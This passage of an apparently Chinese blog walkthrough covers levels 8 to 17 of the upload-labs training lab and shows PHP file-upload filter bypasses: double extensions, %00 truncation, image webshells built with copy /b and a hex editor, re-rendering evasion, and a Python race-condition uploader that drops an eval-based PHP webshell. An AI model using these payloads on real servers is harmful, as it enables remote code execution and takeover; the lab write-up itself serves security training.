title="第八关"></a>第八关</h3><p><strong>和第五关一样，虽然在黑名单检查之前将文件名后的<code>.</code>和空格给删除了，但是<code>.</code>只删除了一次，这里同样使用后缀名<code>php. .</code>去绕过</strong></p><h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p><strong>一样的问题，所以继续用第八关的方法去绕过上传</strong></p><h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p><strong>尝试上传后缀名php的文件，看到可以上传成功，不过后缀名php被删除了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/Hbd6GjC5ci.png?imageslim" alt="mark"><br><strong>后缀名改为大写PHP上传，同样给删除了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/dj8CfC8hAh.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/jg1FB6j93K.png?imageslim" alt="mark"><br><strong>猜想后台使用<code>str_ireplace</code>函数将文件后缀为黑名单的都给删除了，查看过滤代码确实如此</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</div><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</div><div class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</div><div class="line">    $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</div><div class="line">    $is_upload = <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>因为<code>str_ireplace</code>函数只做一次替换，所以使用<code>pphphp</code>后缀名就能绕过</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/JDbd01feKa.png?imageslim" alt="mark"><br><strong>可以看到成功上传php</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/0kI0jjedHg.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/G53DH9G6k6.png?imageslim" alt="mark"></p><h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><p><strong>采用的防御手法是白名单过滤，只允许上传jpg、png和gif类型，并且将上传的文件给重命名为了白名单中的后缀</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line">$file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line"><span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</div><div class="line">   $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">   $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line"></div><div class="line">   <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">   $is_upload = <span class="keyword">true</span>;</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">else</span>&#123;</div><div class="line">   $msg = <span class="string">'上传失败！'</span>;</div><div class="line">   &#125;</div></pre></td></tr></table></figure><p><strong>处理上传文件的方式</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div></pre></td></tr></table></figure><br><strong>看起来这样防御并没有什么问题，但是这一关上传目录是可控的</strong></p><p><strong>所以可以先上传一个后缀名为jpg,内容为一句话木马的文件，然后修改上传目录为.php后缀，之后在.php后使用%00截断后面的拼接内容，注意这里需要关掉<code>magic_quotes_gpc</code>这个php扩展，否则00会被转义</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_GET[<span class="string">'save_path'</span>]这里使用<span class="number">00</span>截断.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div></pre></td></tr></table></figure><p><strong>注意这里的00字符因为在url的GET参数中，所以需用进行url编码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/mA0g49b3ID.png?imageslim" alt="mark"></p><p><strong>通过这种方法就可以成功绕过十一关的上传检测</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/bgIAeh5fhK.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/KAj14k48Hd.png?imageslim" alt="mark"></p><h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h3><p><strong>同样是上传路径可以控制，不同的是这里的路径是以POST参数传递的，同样的这里在目录后面使用00截断</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/I152AJCcI7.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/flcIiI8892.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/2L2fG36AC3.png?imageslim" alt="mark"><br><strong>可以看到成功绕过上传</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/Ib19cJh665.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/j83GG617aG.png?imageslim" alt="mark"></p><h3 id="第十三关-amp-第十四关-amp-第十五关"><a href="#第十三关-amp-第十四关-amp-第十五关" class="headerlink" title="第十三关&amp;第十四关&amp;第十五关"></a>第十三关&amp;第十四关&amp;第十五关</h3><p><strong>任务和之前的不同，这里只需要成功上传图片马，并且图片马里有完整的webshell即可</strong></p><p><strong>对于第十三关第十四关和第十五关这三关都是对文件幻数进行了检测，只不过第十四关使用的是<code>getimagesize</code>函数，第十五关使用的是<code>exif_imagetype</code>函数,函数返回值内容不一样而已</strong></p><p><strong>要想突破文件幻数检测，首先要了解jpg、png、gif这三种文件的头部格式，每种类型的图片内容最开头会有一个标志性的头部，这个头部被称为文件幻数。</strong></p><p><strong>jpg文件头部格式</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/dJ36H5lLGl.png?imageslim" alt="mark"><br><strong>文件头值为<code>FFD8FFE000104A464946</code></strong></p><p><strong>png文件头格式，网上大部分资料写的都是<code>89504E47</code>，但是经过我的测试，这四个16进制是仅仅不够的，如果只是<code>89504E47</code>的话，会使<code>getimagesize</code>函数和<code>exif_imagetype</code>函数报错</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/FglLL507mf.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/JD2hc9BBGB.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/14GjDG5EHK.png?imageslim" alt="mark"><br><strong>经过我的测试真正的文件头值应该是<code>89504E470D0A1A0A</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/GgDHJb3I35.png?imageslim" alt="mark"></p><p><strong>gif文件头格式</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/b9H0a1l3lC.png?imageslim" alt="mark"><br><strong>文件头值为<code>474946383961</code></strong></p><p><strong>经过测试，<code>getimagesize</code>函数和<code>exif_imagetype</code>函数都只是是对文件头进行检查，只要文件头部符合函数就会返回内容</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">"check jpg&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"getimagesize function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(getimagesize(<span class="string">"heishacker.jpg"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"exif_imagetype function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(exif_imagetype(<span class="string">"heishacker.jpg"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;check png&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"getimagesize function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(getimagesize(<span class="string">"mingren.png"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"exif_imagetype function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(exif_imagetype(<span class="string">"mingren.png"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;check gif&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"getimagesize function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(getimagesize(<span class="string">"xiangtian.gif"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"exif_imagetype function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(exif_imagetype(<span class="string">"xiangtian.gif"</span>));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/aImGHa1L1l.png?imageslim" alt="mark"><br><strong>所以这几关都可以上传图片马，图片马的文件头就是正常图片的文件头格式，从而绕过图片幻数检测</strong></p><p><strong>windows下图片马制作方式</strong></p><pre><code>copy x.jpg|png|gif/b+x.php/a x.jpg|png|gif</code></pre><p><strong>参数/b指定以二进制格式复制、合并文件(图片),参数/a指定以ASCII格式复制、合并文件（php文件），x.php文件里为要写的一句话木马</strong></p><p><strong>这三关都可以成功上传图片马，并且里面有完整的一句话木马，但是有时候图片马里面的一些字符会使php报错，导致用文件包含或者解析漏洞去解析图片马中的php时导致解析不了，可以看到利用文件包含去解析三个图片马时均不能解析</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/2C0bBcE130.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/gfIKil3hEd.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/I0GHj8Fe57.png?imageslim" alt="mark"><br><strong>所以在寻找图片制作图片马时需要耐心的寻找一些不会使php报错的图片</strong></p><p><strong>而且有时候对文件大小也有限制，所以绕过文件幻数最合适的方式是利用16进制编辑器自己制作一个伪图片马，这里利用winhex分别创建shell.jpg、shell.png、shell.gif三个伪图片马</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/h4AK5Ja53d.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/HHi4djejE2.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/83mckBeaL3.png?imageslim" alt="mark"><br><strong>之后上传这三个伪图片马，这样不光可以上传成功，也可以利用文件包含漏洞或解析漏洞解析成功</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/F1c6GHHc15.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/D5Hfd4CgEC.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/gcf7F0Fmme.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/CbG93Ghj61.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/LAGG5c4FcB.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/KiIL2KmaHI.png?imageslim" alt="mark"><br><strong>这三关均可以采用这种方式通关，第十五关需要在php配置文件中开启php的php_exif扩展</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180610/m2098dmK3b.png?imageslim" alt="mark"><br><strong>当然，耐心的选择一个合适的图片制作图片马也是可以的</strong></p><h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></div><div class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</div><div class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">$target_path=$UPLOAD_ADDR.basename($filename);</div><div class="line"><span class="comment">// 获得上传文件的扩展名</span></div><div class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</div><div class="line"><span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></div><div class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefromjpeg($target_path);</div><div class="line"><span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</div><div class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</div><div class="line">                imagejpeg($im,$newimagepath);</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</div><div class="line">                unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $msg = <span class="string">"上传失败！"</span>;</div><div class="line">        &#125;</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefrompng($target_path);</div><div class="line"><span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                 <span class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</div><div class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</div><div class="line">                imagepng($im,$newimagepath);</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</div><div class="line">                unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;               </div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $msg = <span class="string">"上传失败！"</span>;</div><div class="line">        &#125;</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefromgif($target_path);</div><div class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</div><div class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</div><div class="line">                imagegif($im,$newimagepath);</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</div><div class="line">                unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $msg = <span class="string">"上传失败！"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>通过第十六关的php代码可以看到对文件后缀名和MIME类型进行了检查，而且用到了php的<code>imagecreatefromjpeg</code>、<code>imagecreatefrompng</code>、<code>imagecreatefromgif</code>这几个图片处理函数对上传的图片进行了二次渲染生成了新的图片，所以如果在这里上传的是一个普通的图片马，虽然图片马可以上传成功，但是上传的图片马在经过二次渲染后，图片尾部的php代码就会被删除掉，所以在这里不能使用直接在图片尾部添加一句话木马的方式去合成图片马。但是这一关的代码有一个明显的逻辑漏洞，如果这几个二次渲染函数处理的不是一个图片，就会使这几个函数报错，因为这几个二次渲染的函数只会去处理一个图片内部格式正确的图片，所以在这里只需要上传一个后缀名为jpg、png、gif的一句话木马，这样的话上传的一句话木马会绕过后缀名和MIME类型的检查，通过<code>move_uploaded_file</code>上传至服务器，但是遇到二次渲染时，由于上传的不是一个真正的图片，所以二次渲染函数在处理时会因为图片的内部格式报错，从而突破了对图片的二次渲染，这时候页面虽然会显示图片格式不允许，但是上传的一句话木马已经上传到了服务器</strong></p><p><strong>分别上传后缀名为jpg、png、gif的一句话木马，可以看到虽然上传的格式不允许，但是一句话马已经上传成功了</strong></p><p><strong>jpg</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180613/0hmC35EhHh.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180613/mf0AaDm4h7.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180613/97HfAf14hF.png?imageslim" alt="mark"><br><strong>png</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180613/8db3Hdmlk3.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180613/Imc99K5gLk.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180613/FC7d5dl7db.png?imageslim" alt="mark"><br><strong>gif</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180613/ELeK4G3DD1.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180613/3B0JFHl0F2.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180613/6f3G4jC51B.png?imageslim" alt="mark"></p><p><strong>以上只是单单针对这道题，那么如何真正的使用图片马突破二次渲染呢？可以看到如果直接使用在图片添加一句话木马的图片马上传的话，在二次渲染后一句话会被删除，导致图片马不能利用</strong></p><p><strong>按照一般的方法制作三种图片马</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180611/9cHGg2FKJJ.png?imageslim" alt="mark"><br><strong>上传jpg图片马</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180611/D995Fg91Hj.png?imageslim" alt="mark"><br><strong>上传后经过<code>imagecreatefromjpeg</code>函数二次渲染，图片尾部的php一句话被删除</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180611/fdKHc46AAE.png?imageslim" alt="mark"><br><strong>导致jpg图片马不能使用</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180611/eeb24D4k3I.png?imageslim" alt="mark"><br><strong>上传png图片马</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180611/e26jJB1aab.png?imageslim" alt="mark"><br><strong>上传后经过<code>imagecreatefrompng</code>函数二次渲染，图片尾部的php一句话被删除</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180611/6DaBgi2C46.png?imageslim" alt="mark"><br><strong>导致png图片马不能使用</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180611/beB9B0k8h6.png?imageslim" alt="mark"><br><strong>上传gif图片马</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180611/hl33HL3Eg2.png?imageslim" alt="mark"><br><strong>上传后经过<code>imagecreatefromgif</code>函数二次渲染，图片尾部的php一句话被删除</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180611/21A8FJHaA9.png?imageslim" alt="mark"><br><strong>导致gif图片马不能使用</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180611/lHcG8bFf4c.png?imageslim" alt="mark"></p><p><strong>尝试制作可以真正突破二次渲染的函数，这里可以通过十六进制编辑器查看比较上传前后图片的十六进制 ，找到二次渲染前后十六进制内容没有改变的部分，尝试将图片马写到这些没有改变的部分</strong></p><p><strong>自己对图片的16进制格式不是太理解，导致只制作出来了突破二次渲染的gif图片马，jpg和png都制作失败了，以后有时间再去研究</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180612/hAj9fmKelg.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180612/aLE7gfmcDh.png?imageslim" alt="mark"><br><strong>将相同的部分（全00）替换为一句话木马，运气比较好，图片并没有损坏，而且绕过了二次渲染，并且没有报php语法错误</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180612/1IGBmAFhEB.png?imageslim" alt="mark"><br><strong>但是jpg和png就不一样了，出现了很多问题，暂时还没有制作出真正图片二次渲染的jpg、png图片马</strong></p><h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p><strong>要求上传一个webshell到服务器，提示需要代码审计，查看php源代码</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</div><div class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</div><div class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line">             rename($upload_file, $img_path);</div><div class="line">             $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</div><div class="line">            unlink($upload_file);</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">'上传失败！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><br><strong>通过php代码可以看到对上传的文件后缀做了白名单限制，如果上传的文件后缀如果不是jpg、png、gif的话就会被删除掉。但是这里可以使用竞争上传的方式去突破，同时使用多个进程去上传php文件，php文件的内容是向服务器目录下写一个webshell，之后不断去去访问上传的php文件，如果在删除该php文件之前访问到了该php文件，就会向服务器目录写一个webshell，用python去实现多进程上传</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CompeteUpload</span><span class="params">(list)</span>:</span></div><div class="line">    url=<span class="string">"http://192.168.242.128/upload-labs/Pass-17/index.php"</span></div><div class="line">    geturl=<span class="string">"http://192.168.242.128/upload-labs/upload/info.php"</span></div><div class="line">    file=&#123;<span class="string">'upload_file'</span>:(<span class="string">'info.php'</span>,<span class="string">"&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[ironman]);?&gt;');?&gt;"</span>,<span class="string">'image/jpeg'</span>)&#125;</div><div class="line">    data=&#123;<span class="string">'submit'</span>:<span class="string">'上传'</span>&#125;</div><div class="line">    r=requests.post(url=url,data=data,files=file)</div><div class="line">    <span class="comment">#print "test upload...."</span></div><div class="line">    r1=requests.get(url=geturl)</div><div class="line">    <span class="keyword">if</span> r1.status_code==<span class="number">200</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"upload success!"</span></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool = Pool(<span class="number">10</span>)</div><div class="line">    pool.map(CompeteUpload, range(<span 